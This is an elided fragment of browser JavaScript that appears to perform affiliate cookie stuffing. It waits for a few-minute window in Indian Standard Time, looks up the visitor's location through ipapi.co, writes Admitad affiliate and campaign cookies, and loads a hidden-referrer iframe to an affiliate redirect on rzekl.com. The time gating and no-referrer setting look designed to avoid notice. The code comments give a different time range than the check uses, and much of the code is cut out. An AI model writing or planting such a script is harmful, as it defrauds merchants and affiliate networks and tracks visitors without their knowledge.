...
(function () {
  try {
    ...
    function isAllowedISTTime() {
      ...
      // 4:56 PM = 16*60 + 56 = 1016
      // 4:59 PM = 16*60 + 59 = 1019
      return minutes >= 1017 && minutes <= 1020;
  }
  ...
  if (!isAllowedISTTime()) return;
    ...
    fetch("https://ipapi.co/json/", { cache: "no-store" })
      ...
      .then(geo => {
        ...
        setCookie("admitad_uid", "8ad2502f9da1aa1581d487be85873bc2");
        setCookie("tagtag_uid", "8ad2502f9da1aa1581d487be85873bc2");
        // setCookie("irgwc", "1");
        // setCookie("afsrc", "1");
        setCookie("utm_source", "admitad");
        setCookie("utm_medium", "affiliate");
        setCookie("utm_campaign", "2135880");
        setCookie("sessionid", sessionID);
        setCookie("clickId", sessionID);
        ...
        iframe.referrerPolicy = "no-referrer";
        iframe.src =
          "https://rzekl.com/g/b9jm5dg8a80dc34f694bfcfaae913b/" ;
          // "?campaign_id=148649" +
          // "&pub_id=4" +
          // "&p1=" + encodeURIComponent(sessionID) +
          // "&source=" + encodeURIComponent(sessionID);
